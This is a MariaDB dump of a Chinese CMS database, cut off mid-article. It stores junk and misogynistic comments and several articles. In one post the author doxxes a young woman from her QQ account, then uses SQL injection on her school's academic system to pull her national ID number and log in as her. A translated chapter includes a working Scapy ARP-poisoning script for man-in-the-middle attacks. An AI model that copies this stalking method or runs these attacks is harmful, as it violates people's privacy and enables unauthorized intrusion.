-- MySQL dump 10.16  Distrib 10.1.8-MariaDB, for Win32 (AMD64)
--
-- Host: localhost    Database: cms
-- ------------------------------------------------------
-- Server version	10.1.8-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
-- MySQL dump 10.16  Distrib 10.1.8-MariaDB, for Win32 (AMD64)
--
-- Host: localhost    Database: cms
-- ------------------------------------------------------
-- Server version	10.1.8-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `cms_comment`
--

DROP TABLE IF EXISTS `cms_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_comment` (
  `id` int(8) unsigned NOT NULL AUTO_INCREMENT,
  `user` varchar(20) NOT NULL COMMENT '评论者',
  `content` varchar(255) NOT NULL COMMENT '内容',
  `state` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核状态',
  `manner` tinyint(4) NOT NULL COMMENT '态度',
  `cid` int(8) NOT NULL COMMENT '文档id',
  `sustain` smallint(6) unsigned NOT NULL,
  `oppose` smallint(6) unsigned NOT NULL,
  `date` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_comment`
--

LOCK TABLES `cms_comment` WRITE;
/*!40000 ALTER TABLE `cms_comment` DISABLE KEYS */;
INSERT INTO `cms_comment` VALUES (3,'hejunwei','看好云时代',1,-1,13,0,0,'2016-04-17 20:37:32'),(5,'hejunwei','喜欢逆向工程',1,1,14,0,0,'2016-04-17 22:10:42'),(6,'hejunwei','asdq3123123123',1,0,14,0,0,'2016-04-17 22:15:06'),(7,'hejunwei','挨打时发生的发的少个人',1,0,14,0,0,'2016-04-17 22:15:33'),(8,'hejunwei','123123',1,0,14,0,0,'2016-04-17 22:44:45'),(9,'majialichen','123123',1,-1,15,0,0,'2016-04-21 11:26:27'),(10,'游客','qwe',1,0,15,0,0,'2016-04-21 11:37:28'),(11,'游客','12',1,0,14,0,0,'2016-04-22 22:20:22'),(12,'游客','123123',1,0,14,0,0,'2016-04-22 22:21:33'),(13,'游客','123213',1,0,14,0,0,'2016-04-22 22:21:56'),(14,'游客','123',1,0,14,0,0,'2016-04-22 22:25:17'),(15,'游客','123',1,0,14,0,0,'2016-04-22 22:26:18'),(16,'游客','123',1,0,14,0,0,'2016-04-22 22:26:32'),(17,'游客','123',1,0,14,0,0,'2016-04-22 22:28:19'),(18,'游客','123',1,0,14,0,0,'2016-04-22 22:29:05'),(19,'游客','123',1,0,14,0,0,'2016-04-22 22:41:13'),(20,'游客','12345',1,0,14,0,0,'2016-04-22 22:50:30'),(22,'游客','123',1,0,14,0,0,'2016-04-23 11:49:30'),(24,'游客','123123',1,0,14,1,1,'2016-04-23 11:53:14'),(25,'游客','123123',1,0,14,2,2,'2016-04-23 11:58:29'),(26,'游客','qqqqq',1,1,16,0,0,'2016-04-23 21:53:10'),(27,'游客','asdasd',1,0,16,0,0,'2016-04-23 21:53:27'),(28,'游客','aaaaa',1,0,16,0,0,'2016-04-23 21:54:28'),(29,'游客','aaaaa',1,0,16,0,0,'2016-04-23 22:01:01'),(30,'hejunwei000','嵌套sql',1,0,19,0,0,'2016-04-26 23:47:18'),(31,'hejunwei','女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人屁事多女人',1,0,25,0,0,'2016-05-01 10:17:04');
/*!40000 ALTER TABLE `cms_comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_content`
--

DROP TABLE IF EXISTS `cms_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_content` (
  `id` int(8) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL,
  `nav` int(11) NOT NULL,
  `attr` varchar(20) NOT NULL,
  `tag` varchar(30) NOT NULL,
  `keyword` varchar(30) NOT NULL,
  `thumb` varchar(100) NOT NULL COMMENT '缩略图',
  `source` varchar(20) NOT NULL COMMENT '文章来源',
  `author` varchar(10) NOT NULL COMMENT '责任编辑',
  `info` varchar(200) NOT NULL COMMENT '简介',
  `content` text NOT NULL COMMENT '详细内容',
  `comment` tinyint(1) NOT NULL DEFAULT '1' COMMENT '评论开关',
  `count` int(11) NOT NULL DEFAULT '0' COMMENT '浏览次数',
  `gold` int(11) NOT NULL DEFAULT '0' COMMENT '消费金币',
  `sort` tinyint(4) NOT NULL DEFAULT '0' COMMENT '排序开关',
  `readlimit` tinyint(1) NOT NULL DEFAULT '0' COMMENT '阅读权限',
  `color` varchar(10) NOT NULL COMMENT '默认颜色',
  `date` datetime NOT NULL COMMENT '发布时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_content`
--

LOCK TABLES `cms_content` WRITE;
/*!40000 ALTER TABLE `cms_content` DISABLE KEYS */;
INSERT INTO `cms_content` VALUES (13,'OpenStack 基于场景的架构设计',30,'推荐,加粗,头条,跳转','云，linux','云，linux','/CMS3.0/uploads/20160410/20160410164001512.jpg','unix','贺钧威','由于OpenStack 是一个很新的开源项目，而且在不断地快速发展，相关的技术资料，特别是中文技术资料非常匮乏，特别是在OpenStack 项目的架构设计实践这方面， 国内尚无权威、完善的中文资料， 这成为制约OpenStack 发展和应用的一项因素。\r\n','<p><strong>话题背景：</strong><br />\r\n<br />\r\n在2011 年的时候，OpenStack 这个项目还没有什么影响力，刚刚发布它的早期版本Diablo，里面只有虚拟计算（Nova），对象存储（Swift）和模板管理（Glance）这三个 主要组件，功能非常有限。整个项目采用了完全的分布式架构设计，各个组件之间采用API 进行通信，整个系统设计比较合理、高效。同时，整个项目采用Python语言来编写，显得比较简洁、优雅。更重要的一点是，OpenStack 独立于任何企业，遵循开源、开放设计、开放开发流程和开放社区的理念，完全由社区主导和维护。OpenStack 项目的这些特性使得它从一开始就非常具有吸引力。<br />\r\n<br />\r\n但由于OpenStack 是一个很新的开源项目，而且在不断地快速发展，相关的技术资料，特别是中文技术资料非常匮乏，特别是在OpenStack 项目的架构设计实践这方面， 国内尚无权威、完善的中文资料， 这成为制约OpenStack 发展和应用的一项因素。<br />\r\n<br />\r\n<br />\r\n<strong><strong>那么，就此问题，我们展开讨论：</strong></strong><br />\r\n<br />\r\n1、OpenStack 目前的成熟度如何？这里的成熟度仅限于适应于企业的某些场景。<br />\r\n<br />\r\n2、在架构OpenS tack阶段应该考虑的因素有哪些？<br />\r\n<br />\r\n3、如何去根据自己的业务模式来转化为OpenStack架构所应该思考的。<br />\r\n<br />\r\n<br />\r\n<strong>活动时间：</strong>2016年4月7日&mdash;5月7日<br />\r\n<br />\r\n<br />\r\n<strong>活动奖励：</strong><br />\r\n<br />\r\n活动结束后，我们将选取5位讨论精彩的同学，送《云落谁家？OpenStack基于场景的架构设计实践》各一本。<br />\r\n<br />\r\n<img alt=\"\" src=\"http://images.china-pub.com/ebook4925001-4930000/4928590/zcover.jpg\" style=\"height:200px; width:148px\" /><br />\r\n<br />\r\n作者： 李建盛&nbsp;&nbsp;<br />\r\n出版社：电子工业出版社<br />\r\nISBN：9787121276491<br />\r\n上架时间：2016-3-9<br />\r\n出版日期：2016 年3月<br />\r\n开本：16开<br />\r\n页码：224<br />\r\n版次：1-1<br />\r\n所属分类：计算机 &gt; 电子商务与计算机文化 &gt; 综合<br />\r\n购买链接：<a href=\"http://item.jd.com/11887046.html\" target=\"_blank\">http://item.jd.com/11887046.html</a><br />\r\n<br />\r\n<strong>内容简介：</strong>本书总共有8 章的内容，将OpenStack 的应用场景分为了几类，每章介绍了不同的场景。第1 章介绍了通用型应用场景；第2~4 章分别介绍了计算密集型、高负载存储型、高吞吐网络型应用场景；第5 章介绍了混合云应用场景；第6 章介绍了跨地域多点型应用场景；第7 章介绍了大规模可扩展型应用场景；第8 章介绍了一些其他的应用场景。<br />\r\n《云落谁家？OpenStack 基于场景的架构设计实践》是写给打算架构设计OpenStack 基础设施即服务云的设计师和架构师们的，以及OpenStack 的咨询顾问、售前顾问。如果你正在考虑如何部署OpenStack，正在考虑如何选择OpenStack 组件、如何选择硬件基础设施、如何解决监控和计费的问题、如何进行架构设计才最具安全性等问题，那么你可以通过《云落谁家？OpenStack 基于场景的架构设计实践》在各个类型的云架构场景中找到想要的答案。<br />\r\n<br />\r\n<strong>样章试读：</strong><a href=\"http://wenku.it168.com/d_001673000.shtml\" target=\"_blank\">http://wenku.it168.com/d_001673000.shtml</a></p>\r\n',0,47,0,4,4,'red','2016-04-10 16:41:11'),(14,'OD使用教程',17,'推荐','OD','OD','/CMS3.0/uploads/20160410/20160410164213228.jpg','鱼C','geek_he','调试篇01|解密系列','<h2>OD默认功能</h2>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1. 汇编代码对应的地址窗口</p>\r\n\r\n<p>2. 汇编代码对应的十六进制机器码窗口</p>\r\n\r\n<p>3. 反汇编窗口</p>\r\n\r\n<p>4. 反汇编代码对应的注释信息窗口</p>\r\n\r\n<p>5. 寄存器信息窗口</p>\r\n\r\n<p>6. 当前执行到的反汇编代码的信息窗口</p>\r\n\r\n<p>7~9. 数据所在的内存地址，十六进制，ASCII码</p>\r\n\r\n<p>10~12.栈地址，存放的数据，对应说明信息</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>OD基本快捷键及功能</h2>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><a href=\"http://blog.fishc.com/wp-content/uploads/2012/08/%E5%9B%BE%E7%89%875.gif\"><img alt=\"\" src=\"http://blog.fishc.com/wp-content/uploads/2012/08/%E5%9B%BE%E7%89%875.gif\" style=\"height:431px; width:780px\" /></a></p>\r\n\r\n<p>OD基本快捷键及功能</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>OD使用实践</h2>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>古语有云，趁热要打铁，趁火要打劫，趁着我们还有点印象，赶紧实践一下吧亲╭(╯3╰)╮！</p>\r\n\r\n<p>要求：通过OD将程序的标题&ldquo;Hello world&rdquo;改为&ldquo;I love FishC.com&rdquo;</p>\r\n\r\n<p><a href=\"http://blog.fishc.com/wp-content/uploads/2012/08/%E5%9B%BE%E7%89%872.jpg\"><img alt=\"\" src=\"http://blog.fishc.com/wp-content/uploads/2012/08/%E5%9B%BE%E7%89%872.jpg\" style=\"height:104px; width:133px\" /></a></p>\r\n\r\n<p>OD使用演示</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;<a href=\"http://fishc.taobao.com\" target=\"_blank\">获得所有教学视频、课件、源代码等资源打包</a>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;\r\n<p><a href=\"http://kuai.xunlei.com/d/LDMJQLCCYMDP\" target=\"_blank\">视频下载</a></p>\r\n</p>\r\n\r\n<p>&nbsp;\r\n<p><a href=\"http://urlxf.qq.com/?IJjYN37\" target=\"_blank\">备胎下载</a></p>\r\n</p>\r\n\r\n<p>&nbsp;</p>\r\n',1,391,0,1,1,'','2016-04-10 16:43:17'),(15,'记一次社工女神',31,'无属性','社会工程学','社会工程学','/CMS3.0/uploads/20160410/20160410164647340.jpg','','admin','记一次社工女神','<p>今晚，基友说他看上一妹纸，感觉要成他女神了。他有QQ，于是让我试试能不能找到她更多资料，才好精准打击，哈哈。</p>\r\n\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/16010722341dc40d69887fc313.png\" /></p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;于是我加她的QQ，没想到同意了。看了看相册，蛮open的妹纸。</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601072231144681827b8da365.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;先整理下思路，有了QQ。首先要先收集信息，名字，爱好，常用密码啥的，越多越好。<br />\r\n&nbsp;&nbsp;先百度下她的qq号，通过她留的QQ的百度贴吧ID，发现了她玩的经常逛的贴吧以及3个号。原谅打码。</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/16010722433fa88f2f07e186d2.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;通过百度搜索，得到了微信，查看了下，确实是她的微信。</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601072248014ed1e3f482f9ff.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;通过某学校的贴吧看到她的回帖记录，发现疑似她的名字：萌欢，估计她的名字带一个<strong>欢</strong>，萌估计是自己叫的，萌萌哒。</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/16010723009122c17edf6ba199.png\" /></p>\r\n</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601072258c1cdafb410a1f02b.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;由 此可知该妹纸是XX学校，经管系模特队的，应该叫某欢，通过她关注的贴吧，知道她的爱好是动漫，佐助，河图，第三十八年夏至......。继续往下，可以 试试找到她的全名，因为知道她的学校，可以通过她的学校，在找她的个人资料。发现她的空间没关，是个open的妹纸，看看她的说说，相册啥的，看看有没有 啥好利用，皇天不负有心人，翻了10多页以后，终于找到了可以利用的信息了！看下图</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601072310f05fe97241120d71.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;看 到这里心好痛，感觉前面的白干了，发现以后绝对要先看对方的QQ空间先。现在有了她的名字，学校班级，手机，微信。难道就到这里了吗？我抽了根烟静静的思 考下，不行，装B不能到这里就结束，不然感觉对不起我的基友！然而接下来要是想获取更多资料，改怎么办？嗯，可能很多人想到了，没错就是教务系统， 教务系统里应该有更多的资料，还可以看看她是不是学霸啥的，哈哈。说干就干，看了下她学校的教务系统是正方，用了最新爆的注入。这里就不详细写过程了，你 们都懂。</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/160107232171998bf0258ecf8b.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;如上图，成功爆出jwc01的账号，只是爆出来的有点奇怪，{MD5}7ClfTdMSjKXd8KuPF6Ko5g== 这样的，后面的==可以去掉。前面是{md5}，然而并不是16或32位的，数了下是22位的。网上搜了下，查了下资料，原来这是<strong>MD5(d_Base64)加密</strong>。然后还原为32位md5为：ec295f4dd3128ca5ddf0ab8f17a2a8e6。到这里，我心情激动，登上jwc01，就搞定了。然而......这md5并没有解出来....<br />\r\n&nbsp;&nbsp;</p>\r\n\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601072337b9fd2714effc1dd1.png\" /></p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;现在怎么办？放弃吗？不。<br />\r\n&nbsp;&nbsp;接 下来我先爆出了个教师的账号，登进去，发现有个学生名单查询。现在的思路是找到妹纸的学号。通过注入查询出妹纸的身份证的信息，很多学校是以学生的学号为 账号，以身份证号作为密码的。直接用学生名的话，我没试，看到burp suite打中文是框框我觉得还是用学号好了。不过按理也可以。<br />\r\n&nbsp;&nbsp;</p>\r\n\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601072359b9cc99ce5131961d.png\" /></p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;然后用sql注入查询她的身份证号码。把<br />\r\n这条语句改一改。不过我还不知道正方数据库的表结构，于是下载了doc看看。<br />\r\n&nbsp;&nbsp;</p>\r\n\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601080003d4fa45c324aa56f7.png\" /></p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;发现，表为XSJBXXB，SFZH（身份证号），XH（学号），更改查询语句为：<br />\r\n&nbsp;&nbsp;成功爆出身份证。</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/160108000801d03357e138850b.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;于是尝试学号+身份证登陆。。。</p>\r\n\r\n<p>&nbsp;\r\n<p><img src=\"https://www.t00ls.net/attachments/month_1601/1601080015a4e25372f99a9a66.png\" /></p>\r\n<br />\r\n&nbsp;&nbsp;<strong>登陆成功！</strong><br />\r\n&nbsp;&nbsp;到这里，这次社工基本就告一段落了，打码没打好的地方，请不要恶搞骚扰人家啥的。<br />\r\n&nbsp;&nbsp;写 这文章也写了好久加上社工也一晚上了，作为一个小白，一路走来不容易，很多论坛都没了，很多论坛在水，想真心学习讨论技术的论坛不多了，或许怪这个时代， 但时代总是在变的，而T00ls却一只独秀，本着低调发展，有着浓厚的技术氛围。很多次我都看着&ldquo;您无权进行当前操作，原因如下：对不起，您还未登录，无 权访问该版块。&rdquo;在想，要是我能进去多好，希望审核的管理大大们，给个机会，谢谢。&nbsp;&nbsp;</p>\r\n',1,2618,0,4,4,'red','2016-04-10 16:47:32'),(16,'Python网络攻防之第二层攻击',23,'推荐,加粗,头条,跳转','python','python','/CMS3.0/uploads/20160410/20160410174315746.png','乌云','贺钧威','Python网络攻防之第二层攻击','<p>本章节节选翻译自<em>《Understanding Network Hacks: Attack and Defense with Python》</em>中的第四章<em>Layer 2 Attacks</em>。该书通过网络层次划分介绍漏洞，并使用<code>Python</code>编写相关利用工具进行网络攻防，每小节均按照&ldquo;<code>原理--代码--解释--防御</code>&rdquo;的结构行文，此书也可与<em>《Python黑帽子:黑客与渗透测试编程之道》</em>相互参照学习，相信会达到较好的效果呦。另译者水平有限，如有错误还请指正与海涵。</p>\r\n\r\n<h1>0x00 摘要</h1>\r\n\r\n<hr />\r\n<p>在本章第二层攻击当中，我们将进入网络<code>hacking</code>的奇幻之旅。让我们回顾一下，第二层是负责在以太网中，使用MAC地址来发送数据包。除了<code>ARP</code>攻击，我们将探讨交换机是如何应对<code>DOS</code>攻击的，以及如何逃逸出<code>VLAN</code>环境。</p>\r\n\r\n<h1>0x01 需求模块</h1>\r\n\r\n<hr />\r\n<p>在<code>Python</code>中，你不必在意原始套接字或网络字节顺序，借由<code>Philippe Biondi</code>编写的<code>Scapy</code>，具有世界上最好的数据包生成器，你可以轻松地定制数据包。既不像在<code>Libnet</code>和<code>C</code>中那样需要指针运算，也不像在<code>RawIP</code>和<code>Perl</code>中，或者是在<code>Scruby</code>和<code>Ruby</code>中，你会被有限的几种协议所束缚。<code>Scapy</code>可以构造从<code>ARP</code>到<code>IP/ICMP</code>，再到<code>TCP/UDP</code>和<code>DNS/DHCP</code>等所有<code>OSI</code>层上的数据包，甚至是更不常见的协议也同样被支持，比如<code>BOOTP</code>, <code>GPRS</code>, <code>PPPoE</code>, <code>SNMP</code>, <code>Radius</code>, <code>Infrared</code>, <code>L2CAP/HCI</code>, <code>EAP</code>。</p>\r\n\r\n<p>现在让我们在第二层网络上，使用<code>Scapy</code>来制造一些麻烦吧！首先你需要用如下的命令安装它：</p>\r\n\r\n<pre>\r\npip install Scapy\r\n</pre>\r\n\r\n<p>现在你将步入经典著名的中间人攻击！</p>\r\n\r\n<h1>0x02 ARP-Cache-Poisoning</h1>\r\n\r\n<hr />\r\n<p>如果一台主机想要发送<code>IP</code>数据包到另一台主机，就必须预先通过使用<code>ARP</code>协议请求目的<code>MAC</code>地址。这个询问会向网络中的所有成员广播。在一个完美的世界中，只有应答的主机是所需的目的主机。在一个不那么完美的世界中，攻击者会每隔几秒向它的受害者发送一个<code>ARP</code>应答报文，但是是以它自己的<code>MAC</code>地址作为响应，从而重定向该连接到其自身。因为大多数的操作系统都接受它们从未询问过的应答报文，所以该攻击才会生效！</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n\r\n			<p>21</p>\r\n\r\n			<p>22</p>\r\n			</td>\r\n			<td>\r\n			<p><code>#!/usr/bin/python</code></p>\r\n\r\n			<p><code>import</code> <code>sys</code></p>\r\n\r\n			<p><code>import</code> <code>time</code></p>\r\n\r\n			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sendp, ARP, Ether&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>3</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot;: &lt;target&gt; &lt;spoof_ip&gt;&quot;</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>1</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>iface </code><code>=</code> <code>&quot;eth0&quot;</code></p>\r\n\r\n			<p><code>target_ip </code><code>=</code> <code>sys.argv[</code><code>1</code><code>]</code></p>\r\n\r\n			<p><code>fake_ip </code><code>=</code> <code>sys.argv[</code><code>2</code><code>]&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>ethernet </code><code>=</code> <code>Ether()</code></p>\r\n\r\n			<p><code>arp </code><code>=</code> <code>ARP(pdst</code><code>=</code><code>target_ip,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>psrc</code><code>=</code><code>fake_ip,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>op</code><code>=</code><code>&quot;is-at&quot;</code><code>)</code></p>\r\n\r\n			<p><code>packet </code><code>=</code> <code>ethernet </code><code>/</code> <code>arp&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>while</code> <code>True</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sendp(packet, iface</code><code>=</code><code>iface)</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>time.sleep(</code><code>10</code><code>)</code></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>在<code>Scapy</code>的帮助下，我们构造了一个名为<code>packet</code>的数据包，里面包括一个<strong>Ethernet()</strong>及一个<strong>ARP()</strong>头。在ARP头部中，我们设置了受害者的IP地址（<code>target_ip</code>）和我们想劫持所有连接的IP地址（<code>fake_ip</code>）。对于最后一个参数，我们设置<strong>OP-Code</strong>为<code>is-at</code>，声明该数据包为一个ARP响应。然后<code>sendp()</code>函数在每次发送数据包时，都等待10秒并一直循环发送下去。</p>\r\n\r\n<p>需要注意的是，你必须使用<code>sendp()</code>函数而不是<code>send()</code>函数，因为数据包应该在第二层被发送。<code>send()</code>则是在第三层发送数据包。</p>\r\n\r\n<p>最后，要记得启用IP转发，否则你的主机会阻塞来自受害者的连接。</p>\r\n\r\n<pre>\r\nsysctl net.ipv4.ip_forward=1\r\n</pre>\r\n\r\n<p>不要忘记检查像<code>IPtables</code>这样的数据包过滤器的设置，使用<code>pf</code>或<code>ipfw</code>或直接禁用它，现在已经了解了足够多的枯燥的理论知识，让我们直接进入一些实用的<code>Python</code>代码吧！</p>\r\n\r\n<p>如果你只是用<code>fake_ip</code>来处理客户端的<code>ARP</code>缓存，那么你只会得到客户端的数据包，而无法接收到服务端的响应。如下图所示。</p>\r\n\r\n<p><img alt=\"enter image description here\" src=\"http://static.wooyun.org//drops/20150914/2015091406295823477.png\" /></p>\r\n\r\n<p>如下图所示，要强制通过攻击者的主机进行双向连接，攻击者就必须使用他的<code>MAC</code>地址，来伪造客户端和服务端的相关目的地址。</p>\r\n\r\n<p><img alt=\"enter image description here\" src=\"http://static.wooyun.org//drops/20150914/2015091406295940612.png\" /></p>\r\n\r\n<p>我们的第一段代码有些粗糙，它发送了大量的<code>ARP</code>报文，不仅产生了所需要的流量，而且也比较暴露。隐蔽的攻击者会采取另一种策略。</p>\r\n\r\n<p>一台主机如果想要获取有关<code>IP</code>地址的信息，会发出一个<code>ARP</code>请求。我们将编写一个程序，等待<code>ARP</code>请求，并为每一个接收到的请求发送一个<code>ARP</code>欺骗响应。在交换环境中，这将导致每一个连接都会流经攻击者的主机，因为在<code>ARP</code>缓存中，每一个<code>IP</code>地址都会有攻击者的<code>MAC</code>地址。这个攻击更加优雅，不像之前的那个那么嘈杂，但还是很容易被一个训练有素的管理员检测到。</p>\r\n\r\n<p>如下图所示，欺骗性的响应数据包和真实主机的响应数据包被并行发送。谁的数据包先被受害者的网卡接收到，则谁获胜。</p>\r\n\r\n<p><img alt=\"enter image description here\" src=\"http://static.wooyun.org//drops/20150914/2015091406295944994.png\" /></p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n\r\n			<p>21</p>\r\n\r\n			<p>22</p>\r\n\r\n			<p>23</p>\r\n\r\n			<p>24</p>\r\n\r\n			<p>25</p>\r\n\r\n			<p>26</p>\r\n\r\n			<p>27</p>\r\n\r\n			<p>28</p>\r\n			</td>\r\n			<td>\r\n			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>import</code> <code>sys</code></p>\r\n\r\n			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sniff, sendp, ARP, Ether&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot; &lt;iface&gt;&quot;</code></p>\r\n\r\n			